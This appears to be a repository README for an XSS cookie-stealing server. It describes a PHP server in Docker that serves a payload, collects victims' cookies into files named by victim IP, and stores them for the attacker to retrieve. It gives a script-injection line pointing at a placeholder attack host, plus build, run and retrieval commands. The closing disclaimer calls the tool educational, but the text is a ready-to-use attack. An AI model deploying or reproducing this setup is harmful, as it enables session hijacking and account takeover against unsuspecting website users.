# XSS Server
A PHP web server that provides a payload delivered by XSS. Once the script is triggered, it steals the user's cookies (from the website the XSS was triggered on) and stores them in a file on the server.

You can deliver the payload with the following example exploit (change your exploitation of the XSS vulnerability - different servers try to mitigate XSS in different ways):
```
<script src="https://<attack_server_hostname>/payload.php></script>
```
## Building and launching with Docker
```
$ docker build -t xss-server:1 .
$ docker run -d -p 80:80 --name xss-server xss-server:1
```
## Entering Server to obtain stolen cookies
```
$ docker exec -it xss-server bash
```
Files are stored in the format `<victim_ip>.cky` and contain the victim's cookies exactly as if running `console.log(document.cookies)`.

---
## Disclaimer
This server is for educational purposes only. I do not take responsibility for its unethical use against unauthorized targets.
